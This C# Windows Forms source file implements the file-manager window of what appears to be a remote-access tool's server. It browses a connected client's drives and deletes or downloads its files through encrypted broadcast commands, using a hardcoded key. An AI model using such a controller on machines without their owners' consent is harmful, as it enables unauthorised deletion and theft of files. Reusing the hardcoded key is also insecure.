using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.ListViewItem;

namespace server
{
	public partial class filemanager : Form
	{
		public static filemanager instance;
		public Form1.Client selected_client;
		public filemanager()
		{
			InitializeComponent();
			instance = this;
		}
		public filemanager(Form1.Client cli)
		{
			InitializeComponent();
			instance = this;
			selected_client = cli;
			this.Text = "File Manager - Environment: " + selected_client.environment + " [" +
				selected_client.IP + ":" + selected_client.port.ToString() + "]";

			Form1.instance.server.BroadcastLine(
				Form1.instance.encryptus("[******]" + selected_client.IP + ":" +
				selected_client.port.ToString() + "[******]", "D4MVCINM42XS"));
		}

		internal void addcombolist(string itm)
        {
			drivescombo.Items.Add(itm);
        }

		internal void addlist(string[] str, int index)
		{
			ListViewItem item = new ListViewItem(str);
			item.ImageIndex = index;
			filelistview.Items.Add(item);
		}

		private void searchbutton_Click(object sender, EventArgs e)
		{
			foreach(ListViewItem itm in filelistview.Items)
			{
				if (itm == filelistview.Items[0]) continue;
				itm.Remove();
			}
			if (!directorybox.Text.EndsWith(@"\")) directorybox.Text += @"\";
			Form1.instance.server.BroadcastLine(
				Form1.instance.encryptus("[*]" + selected_client.IP + ":" +
				selected_client.port.ToString() + "[*]" + directorybox.Text, "D4MVCINM42XS"));
			drivescombo.Items.Clear();
			Form1.instance.server.BroadcastLine(
				Form1.instance.encryptus("[******]" + selected_client.IP + ":" +
				selected_client.port.ToString() + "[******]", "D4MVCINM42XS"));
		}

		private void filelistview_DoubleClick(object sender, EventArgs e)
		{
			if (filelistview.SelectedItems.Count > 1) return;
			if (!filelistview.SelectedItems[0].Equals(filelistview.Items[0]) && !filelistview.SelectedItems[0].SubItems[1].Text.Equals("Directory")) return;
			if (filelistview.SelectedItems[0].Equals(filelistview.Items[0]))
			{
				string[] split = directorybox.Text.Split('\\');
				if(split.Length > 2) directorybox.Text = directorybox.Text.Remove(directorybox.Text.IndexOf(split[split.Length - 2]));
			}
			else directorybox.Text += filelistview.SelectedItems[0].Text.Remove(0, 1) + @"\";
			foreach (ListViewItem itm in filelistview.Items)
			{
				if (itm == filelistview.Items[0]) continue;
				itm.Remove();
			}
			Form1.instance.server.BroadcastLine(
				Form1.instance.encryptus("[*]" + selected_client.IP + ":" +
				selected_client.port.ToString() + "[*]" + directorybox.Text, "D4MVCINM42XS"));
		}

		private void filelistview_MouseClick(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Right)
			{
				var focusedItem = filelistview.FocusedItem;
				if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
				{
					contextMenuStrip2.Show(Cursor.Position);
				}
			}
		}

		private void contextMenuStrip2_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
		{
			if (filelistview.SelectedItems.Count > 1) return;
			if (filelistview.SelectedItems[0].Equals(filelistview.Items[0])) return;
			ToolStripItem itm = e.ClickedItem;
			if (itm == deleteStripMenuItem)
			{
				DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete this file?\n(!) If the file is a directory, it might take a while!", 
					"Are you sure?", System.Windows.Forms.MessageBoxButtons.OKCancel, System.Windows.Forms.MessageBoxIcon.Question);
				if (dialogResult == DialogResult.OK)
				{
					Form1.instance.server.BroadcastLine(
						Form1.instance.encryptus("[**]" + selected_client.IP + ":" +
						selected_client.port.ToString() + "[**]" + directorybox.Text + filelistview.SelectedItems[0].Text.Remove(0, 1), "D4MVCINM42XS"));
					contextMenuStrip2.Hide();
					System.Threading.Thread.Sleep(1000);
					serverlog.instance.log(string.Format("Deleted file [{0}] from {1} [{2}:{3}].\n", 
						filelistview.SelectedItems[0].Text.Remove(0, 1), selected_client.environment, selected_client.IP,
						selected_client.port.ToString()));
					foreach (ListViewItem itmm in filelistview.Items)
					{
						if (itmm == filelistview.Items[0]) continue;
						itmm.Remove();
					}
					if (!directorybox.Text.EndsWith(@"\")) directorybox.Text += @"\";
					Form1.instance.server.BroadcastLine(
						Form1.instance.encryptus("[*]" + selected_client.IP + ":" +
						selected_client.port.ToString() + "[*]" + directorybox.Text, "D4MVCINM42XS"));
				}
			}
			else if(itm == downloadtoolStripMenuItem)
			{
				contextMenuStrip2.Hide();
				if (filelistview.SelectedItems[0].SubItems[1].Text.Equals("Directory"))
					MessageBox.Show("You cannot use this function on a directory.", "Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
				else
				{
					serverlog.instance.log(string.Format("Attempting to download file [{0}] from {1} [{2}:{3}].\n",
						filelistview.SelectedItems[0].Text.Remove(0, 1), selected_client.environment, selected_client.IP,
						selected_client.port.ToString()));
					Form1.instance.server.BroadcastLine(
						Form1.instance.encryptus("[***]" + selected_client.IP + ":" +
						selected_client.port.ToString() + "[***]" + directorybox.Text + filelistview.SelectedItems[0].Text.Remove(0, 1), "D4MVCINM42XS"));
					
				}
			}
		}

		private void searchfilebutton_Click(object sender, EventArgs e)
		{
			if (searchbox.Text.Length < 1) return;
			foreach (ListViewItem itm in filelistview.Items)
			{
				if (itm == filelistview.Items[0]) continue;
				if (!Regex.IsMatch(itm.Text, searchbox.Text, RegexOptions.IgnoreCase)) itm.Remove();
			}
		}

		private void howToToolStripMenuItem_Click(object sender, EventArgs e)
		{
			MessageBox.Show(
				"Directory GroupBox: contains a list of the local drives, the directory path you are currently in, and the Search button (self explanatory).\n" +
				"(!) You can also travel to a specific directory using this textbox.\n" +
				"Search GroupBox: you can search for a specific file in the directory you are currently in.\n" +
				"Always use the Server Log to keep track of your activities.", "How To", MessageBoxButtons.OK, MessageBoxIcon.Information);
		}

        private void drivescombo_SelectedIndexChanged(object sender, EventArgs e)
        {
			string sp = drivescombo.Text.Split('[')[0];
			directorybox.Text = sp.Remove(sp.Length - 1);

		}
    }
}
